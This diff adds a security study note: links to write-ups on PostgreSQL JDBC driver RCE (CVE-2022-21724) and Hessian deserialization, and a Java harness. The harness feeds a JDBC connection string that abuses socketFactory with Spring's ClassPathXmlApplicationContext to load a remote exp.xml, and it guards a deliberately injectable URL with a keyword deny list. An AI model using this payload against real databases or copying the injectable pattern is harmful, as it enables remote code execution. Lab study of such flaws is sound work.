@@ -1,0 +1,38 @@
+https://blog.csdn.net/qq_32731075/article/details/124695864   PostgreSQL JDBC Driver RCE&任意文件写入漏洞【CVE-2022-21724】
+
+https://y4er.com/posts/wangdingbei-badbean-hessian2/   
+
+https://xz.aliyun.com/t/11720
+
+https://github.com/wlj-debug/Hessian-Deserialize-RCE
+
+
+package jdbc;
+
+import java.sql.DriverManager;
+import java.sql.SQLException;
+
+public class PostgreSQLJDBCiNJECTION {
+
+    public static void main(String[] args) throws Exception {
+        String database = "test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8282/exp.xml";
+        System.out.println(jdbctest(database));
+    }
+    public static String jdbctest(String databases)
+            throws Exception {
+        if (databases != null && !databases.contains("ClassPathXmlApplicationContext")
+                && !databases.contains("FileSystemXmlApplicationContext")) {
+            try {
+                Class.forName("org.postgresql.Driver");
+                DriverManager.getConnection("jdbc:postgresql://127.0.0.1:5000/" + databases);
+            }
+            catch (SQLException throwables) {
+                return "error......";
+            }
+            return "success....";
+        }
+        else {
+            return "no db....";
+        }
+    }
+}
